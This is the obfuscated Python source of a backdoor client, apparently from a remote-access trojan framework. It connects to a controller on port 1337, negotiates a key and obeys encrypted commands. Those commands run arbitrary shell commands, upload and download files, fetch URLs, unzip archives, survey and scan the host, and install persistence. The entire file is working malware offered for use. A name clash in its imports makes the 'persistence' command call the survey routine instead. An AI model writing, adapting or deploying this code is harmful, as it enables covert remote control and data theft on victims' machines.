#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import XqHWrremwBFsMYrDDXfxsCwsOQaHkIuZ, tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc, cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc
    from core.filesock import oObhPcBxCTMcssEIlptmwgzCPHPiFSKF, zNAZkysAqusNrAkwvlbriurTqUjGQrDM
    from core.persistence import rfNCAgnAnRylAPIRGWkGlkRoAehDvsQR
    from core.scan import MvZinykUruQJuVLuSfOSJrTlUqTbQNfH
    from core.survey import rfNCAgnAnRylAPIRGWkGlkRoAehDvsQR
    from core.toolkit import KehMkcIWuqhhzGBYmDhABhFBbSUHTUGm, KfgGTgPuzocurWrNYsVgHYMbLmPIPMyF
except ImportError as iHdzDbEPxnIlhaVzeHKFKxiPfLAsnrBo:
    print(iHdzDbEPxnIlhaVzeHKFKxiPfLAsnrBo)
    sys.exit(0)
vSTlNGFuCjaYUnLpSGwFWkFhymrJclwP = sys.platform
AuYumZSckkhyCvlKFfTQUUerAbhmdKIo      = 'localhost'
gFAnGHOKIOVzJiuTIMTIATgwuezbKTmw      = 1337
qrASmZOitJtIeKqkMasKNiveSHnFthoL    = 'b14ce95fa4c33ac2803782d18341869f'
def rnPzBFRNluoIbLWxfabFISenRvvykfNm():
    KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx = socket.socket()
    KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.connect((AuYumZSckkhyCvlKFfTQUUerAbhmdKIo, gFAnGHOKIOVzJiuTIMTIATgwuezbKTmw))
    kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU = cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc(KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx)
    while True:
        mxALzmYISWzbrdqWKkJHfHUSVeOsRYVb = KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.recv(1024)
        mxALzmYISWzbrdqWKkJHfHUSVeOsRYVb = XqHWrremwBFsMYrDDXfxsCwsOQaHkIuZ(mxALzmYISWzbrdqWKkJHfHUSVeOsRYVb, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
        tYprDeVpyzkXPpgOohflUzwikfxRRfbI, _, action = mxALzmYISWzbrdqWKkJHfHUSVeOsRYVb.partition(' ')
        if tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'quit':
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.close()
            sys.exit(0)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'run':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs.stdout.read() + VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs.stderr.read()
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.sendall(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'download':
            for zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM in action.split():
                zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM = zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM.strip()
                zNAZkysAqusNrAkwvlbriurTqUjGQrDM(KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx, zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'upload':
            for zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM in action.split():
                zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM = zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM.strip()
                oObhPcBxCTMcssEIlptmwgzCPHPiFSKF(KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx, zyPjVbORiUtMykNmPTGiQhVLHeNqfWTM, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'rekey':
            kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU = cJztLgRLvBKNyUXLGobSZLWlhbvHEtfc(KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx)
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'persistence':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = rfNCAgnAnRylAPIRGWkGlkRoAehDvsQR(vSTlNGFuCjaYUnLpSGwFWkFhymrJclwP)
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'wget':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = KehMkcIWuqhhzGBYmDhABhFBbSUHTUGm(action)
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'unzip':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = KfgGTgPuzocurWrNYsVgHYMbLmPIPMyF(action)
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'survey':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = rfNCAgnAnRylAPIRGWkGlkRoAehDvsQR(vSTlNGFuCjaYUnLpSGwFWkFhymrJclwP)
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
        elif tYprDeVpyzkXPpgOohflUzwikfxRRfbI == 'scan':
            VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs = MvZinykUruQJuVLuSfOSJrTlUqTbQNfH(action)
            KEfKtinHjESFlEsKVSeKTfsUWJwRkCbx.send(tVDmDmjQtBrNujmFMifjLQBPSaCrtfRc(VBWvUqJqQpaVYcOcVKgNlijJjXhWmrMs, kzpnKbfMEGKqJgQETNXyGwbhFtMGvIKU))
if __name__ == '__main__':
    rnPzBFRNluoIbLWxfabFISenRvvykfNm()
